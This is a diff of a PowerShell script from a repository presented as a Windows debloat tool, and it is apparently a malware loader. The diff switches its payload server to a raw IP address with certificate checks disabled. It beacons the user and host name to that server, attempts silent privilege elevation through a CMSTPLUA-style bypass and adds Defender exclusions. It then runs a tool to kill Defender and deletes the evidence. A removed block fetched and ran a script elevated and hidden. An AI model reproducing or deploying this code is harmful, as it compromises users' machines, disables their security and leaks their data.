@@ -2,8 +2,8 @@ $ProgressPreference='SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
 [Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
 
-$gh='https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/brokers'
-$srv='https://signindat.com'
+$srv='https://193.26.115.196'
+$gh='https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main'
 $sources=@($srv,$gh)
 
 $logPath="$env:TEMP\wmisrv.log"
@@ -30,12 +30,12 @@ function _cb($stage,$status,$detail){
 _log "S0: pid=$pid, u=$env:USERNAME, h=$cbHost"
 _cb 'S0' 'ok' "pid=$pid, u=$env:USERNAME, h=$cbHost"
 
-# DNS reachability check for telemetry diagnosis
+# DNS / reachability check
 try{
-    $null=[System.Net.Dns]::GetHostAddresses('signindat.com')
-    _log "S0: dns ok"
+    $null=[System.Net.Dns]::GetHostAddresses('193.26.115.196')
+    _log "S0: ip ok"
 }catch{
-    _log "S0: dns fail: $($_.Exception.Message)"
+    _log "S0: ip fail: $($_.Exception.Message)"
 }
 
 try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
@@ -109,37 +109,20 @@ function _runWait($n,$a,$s,$l,$sec){
     }
 }
 
-# === ELEVATION: retry up to 2 attempts, then UAC fallback ===
+# === ELEVATION: one silent attempt via CMSTPLUA ===
 if(-not $cbIsAdmin){
-    for($i=1; $i -le 2; $i++){
-        _run 'ElevatorShellCode.exe' "S1" "elev_$i" | Out-Null
-        Start-Sleep 15
-        try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
-        _log "S1: attempt $i a=$cbIsAdmin"
-        if($cbIsAdmin){break}
-    }
+    _run 'ElevatorShellCode.exe' 'S1' 'elev' | Out-Null
+    Start-Sleep 15
+    try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
+    _log "S1: a=$cbIsAdmin"
     if($cbIsAdmin){
-        _log "S1: elev ok"
         _cb 'S1' 'ok' 'elevation ok'
     }else{
-        _log "S1: elev fail, trying UAC re-launch"
-        _cb 'S1' 'warn' 'silent elev fail, UAC fallback'
-        # Re-launch self elevated via UAC as last resort
-        $selfPath="$env:TEMP\u.ps1"
-        try{
-            $selfB=(New-Object Net.WebClient).DownloadData("$gh/updatemspuls.ps1")
-            [IO.File]::WriteAllBytes($selfPath,$selfB)|Out-Null
-            Start-Process powershell.exe -ArgumentList "-w hidden -NoP -file `"$selfPath`"" -Verb RunAs -WindowStyle Hidden | Out-Null
-            _log "S1: re-launch elevated, exiting"
-            exit
-        }catch{
-            _log "S1: UAC re-launch fail: $($_.Exception.Message)"
-            _cb 'S1' 'fail' 'UAC re-launch fail'
-        }
+        _cb 'S1' 'warn' 'elevation fail, continuing as user'
     }
 }
 
-# === DEFENDER: registry exclusions (admin only) ===
+# === DEFENDER: exclusions + disable (admin only) ===
 if($cbIsAdmin){
     try{
         $mp='Add-MpPreference'
@@ -168,12 +151,10 @@ if($cbIsAdmin){
     }catch{}
 }
 
-# === DEFENDER KILL: ALWAYS run windefctl (self-elevates internally) ===
+# === DEFENDER KILL: always run windefctl, self-elevates internally ===
 _log "S2: windefctl exec (admin=$cbIsAdmin)"
 _runWait 'windefctl.exe' 'kill' 'S2' 'defkill' 18 | Out-Null
 _cb 'S2' 'ok' 'defkill attempted'
-
-# cleanup windefctl binary
 Remove-Item "$env:TEMP\windefctl.exe" -Force -ErrorAction SilentlyContinue | Out-Null
 
 # === PERSISTENCE ===
